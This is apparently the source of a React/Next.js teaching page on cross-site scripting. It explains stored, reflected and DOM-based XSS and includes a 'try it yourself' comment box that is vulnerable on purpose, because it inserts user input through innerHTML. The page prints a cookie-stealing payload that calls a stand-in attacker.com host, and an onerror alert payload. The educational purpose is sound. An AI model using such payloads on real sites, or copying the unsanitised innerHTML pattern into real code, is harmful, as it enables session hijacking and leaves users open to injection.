"use client";

import React from 'react';

import Nav from '@/app/components/Nav';
import Code from '@/app/components/Code';
import Footer from '@/app/components/Footer';
import Emphasis from '@/app/components/Emphasis';

export default function xss() {
  const commentRef = React.useRef<HTMLDivElement>(null);
  const [comment, setComment] = React.useState<string>('');

  const addComment = (e: React.FormEvent) => {
    e.preventDefault();

    // This is exploitable!
    if (commentRef.current) {
      const newComment = document.createElement('div');
      newComment.innerHTML = comment;

      newComment.style.borderLeft = '2px solid slateblue';
      newComment.style.paddingLeft = '10px';
      newComment.style.marginBottom = '8px';

      commentRef.current.appendChild(newComment);

      setComment('');
    }
  };

  return (
    <>
      <Nav/>
      <div className="flex flex-col items-center font-bold">
        <h2 className="bg-gradient-to-r from-indigo-100 to-indigo-300 rounded w-max text-3xl px-3 py-px my-2">AN INTRODUCTION TO</h2>
        <h1 className="text-5xl">CROSS-SITE SCRIPTING</h1>
      </div>

      <div className="flex flex-col justify-center items-center mx-10 px-24 py-6 text-lg space-y-6">
        <p>
        Cross-Site Scripting (XSS) is a type of security vulnerability in web applications where an attacker injects <Emphasis>malicious scripts</Emphasis>  into content that is sent to other users. When the application displays this content, 
        the malicious script runs in the context of the victim's browser, potentially allowing the attacker to 
        perform actions on behalf of the user.
        </p>
        <h2 className="bg-gradient-to-r from-indigo-100 to-indigo-300 rounded w-max text-3xl px-3 py-px font-bold">HOW IS XSS PERFORMED</h2>
        <p>
        XSS typically occurs because a web application accepts <Emphasis>untrusted input</Emphasis> and then includes this input in responses sent to users, without proper <Emphasis>sanitisation.</Emphasis> This allows attackers to <Emphasis>inject</Emphasis> code, 
        such as JavaScript, into a web page.
        </p>
        <p>Consider a comments section on an article. A user might normally adds comments like "Hi, great writeup!" However, if there is no sanitisation, an attacker may maliciously submit</p>
        <Code value="<script>fetch('https://attacker.com/steal?cookie=' + document.cookie);</script>" language="html" />
        <p>
        as their comment. When this comment is displayed, the script runs in the context of the victim's browser, and so the session cookies of the user is sent to the attacker's server.
        If this is successful, the attacker is now able to hijack the user's session. Other malicious scripts may also be used to capture keystrokes of the user
        or even conduct phishing within the web application.
        </p>
        <h2 className="bg-gradient-to-r from-indigo-100 to-indigo-300 rounded w-max text-3xl px-3 py-px font-bold">TYPES OF XSS</h2>
        <span className='mb-8'>
          In a <Emphasis>Stored XSS</Emphasis> attack, the malicious script is permanently stored on the server, for example in a database.
          When other users view the page, the script is included in the page content and executed in their browsers.
          These attacks are particularly dangerous because they affect all users who access the page.
        </span>
        <span>
          In a <Emphasis>Reflected XSS</Emphasis>  attack, the malicious script is included in a URL or HTTP request and reflected back by the server in the response.
          This type of attack requires the victim to click on a specially crafted link containing the malicious code.

          For instance, consider a scenario where an attacker sends a phishing email with the link below.
        </span>
        <Code value="https://example.com?search=<script>...</script>" language='html' />
        <span> 
          If the web application displays the search parameter value without proper sanitization, 
          the attacker’s script executes in the user's browser when they click the link.
        </span>
        <span className="mt-8">
        In <Emphasis>DOM-based</Emphasis> XSS, the security vulnerability exists within the client-side JavaScript code. The malicious script is injected directly into the Document Object Model (DOM) without passing through the server.
        This attack occurs when JavaScript on the page reads untrusted data, for example from the URL or form inputs, and inserts this directly into the DOM without sanitisation.
        </span>

        <h2 className="bg-gradient-to-r from-indigo-100 to-indigo-300 rounded w-max text-3xl px-3 py-px font-bold">TRY IT YOURSELF</h2>
        <p>
          The following mini application mimics a comments section. Users may freely type comments in the input field, which are then displayed on the right.
          However, if a malicious script like the one below is injected...
        </p>
        <Code value="&lt;img src=&quot;invalid&quot; onerror=&quot;alert('Fell prey to XSS!')&quot; /&gt;" language='html' />
      </div>

      <div className="flex flex-row w-screen justify-center mb-12">
        <form onSubmit={addComment} className="flex flex-col w-4/12 h-max items-start justify-evenly border border-indigo-200 px-6 py-4 rounded">
          <h2 className="place-self-center bg-gradient-to-r from-indigo-50 to-indigo-200 rounded w-max text-lg px-3 py-px my-2 font-bold">Post a comment</h2>
          <input
            type="text"
            value={comment}
            onChange={(e) => setComment(e.target.value)}
            required
            placeholder="Enter your comment"
            id='comment'
            className="border-b rounded-sm w-full my-4 px-1"
          />
          <button type="submit" className="place-self-end border border-indigo-100 text-indigo-500 px-3 py-2 rounded hover:bg-indigo-50 hover:text-indigo-700 duration-150"><i className="fa-solid fa-paper-plane"/></button>
        </form>

        <div ref={commentRef} id="comments" className='flex flex-col w-4/12 px-6 py-4'>
          <h2 className='self-center bg-gradient-to-r from-indigo-50 to-indigo-200 rounded w-max text-lg px-3 py-px my-2 font-bold'><i className="fa-solid fa-comments"/> Comments</h2>
        </div>
      </div>

      <Footer/>
    </>

  );
}

